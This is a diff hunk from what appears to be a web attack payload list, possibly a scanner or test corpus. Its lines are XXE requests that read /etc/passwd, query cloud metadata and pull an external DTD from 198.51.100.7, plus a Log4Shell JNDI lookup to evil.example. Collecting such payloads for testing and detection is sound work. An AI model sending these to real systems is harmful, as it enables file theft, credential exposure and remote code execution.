@@ -440,6 +440,9 @@ POST /xml body="<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/re
 POST /xml body="<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\">]>"
 POST /xml body="<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">"
 POST /api/soap body="<soap><!DOCTYPE x [<!ENTITY y SYSTEM \"file:///x\">]></soap>"
+POST /xml header="Content-Type: application/xml" body="<!DOCTYPE foo SYSTEM \"http://198.51.100.7/x.dtd\"><foo>&xxe;</foo>"
+POST /xml header="Content-Type: application/xml" body="<!DOCTYPE foo PUBLIC \"-//X//EN\" \"http://198.51.100.7/x.dtd\"><foo/>"
+POST /xml header="Content-Type: application/xml" body="<!doctype foo SYSTEM \"http://198.51.100.7/x.dtd\"><foo/>"
 
 # --- Log4Shell ---
 GET /?x=${jndi:ldap://evil.example/x}
